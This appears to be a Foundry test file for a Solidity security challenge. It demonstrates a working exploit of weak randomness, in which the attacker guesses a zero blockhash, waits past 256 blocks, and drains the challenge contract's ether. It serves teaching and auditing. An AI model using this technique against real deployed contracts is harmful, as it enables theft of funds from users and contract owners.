
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public challenge;
    address public attacker;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
    }

    function test_highlightPredictableRandomValue(uint256 initialBlockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure we start at a reasonable block number to avoid underflow issues
        vm.assume(initialBlockNumber > 1);
        vm.assume(initialBlockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        
        // Set the initial block number
        vm.roll(initialBlockNumber);
        
        vm.startPrank(attacker);
        
        // The vulnerability: blockhash() returns 0 for blocks older than 256 blocks
        // We can predict this by locking in a guess of bytes32(0) and waiting 257+ blocks
        
        bytes32 predictedAnswer = bytes32(0);
        
        // Lock in our guess with the predicted value (0)
        challenge.lockInGuess{value: 1 ether}(predictedAnswer);
        
        // The guess is locked for block.number + 1
        uint256 guessBlock = initialBlockNumber + 1;
        
        // --- 3. Replication & Assertion ---
        
        // Move forward more than 256 blocks so blockhash returns 0
        // blockhash only works for the 256 most recent blocks
        vm.roll(guessBlock + 257);
        
        // At this point, blockhash(guessBlock) will return bytes32(0)
        // because the block is older than 256 blocks
        bytes32 actualBlockhash = blockhash(guessBlock);
        
        // Verify our prediction is correct - blockhash returns 0 for old blocks
        assertEq(actualBlockhash, predictedAnswer, "Blockhash should be 0 for blocks older than 256");
        
        // Record balance before settling
        uint256 balanceBefore = attacker.balance;
        
        // Execute the settle function - should succeed and pay out 2 ether
        challenge.settle();
        
        // Verify the attacker received the payout (2 ether)
        uint256 balanceAfter = attacker.balance;
        assertEq(balanceAfter - balanceBefore, 2 ether, "Attacker should receive 2 ether payout");
        
        // Verify the contract is now drained
        assertEq(address(challenge).balance, 0, "Contract should be drained");
        
        vm.stopPrank();
    }

    receive() external payable {}

    fallback() external payable {}
}
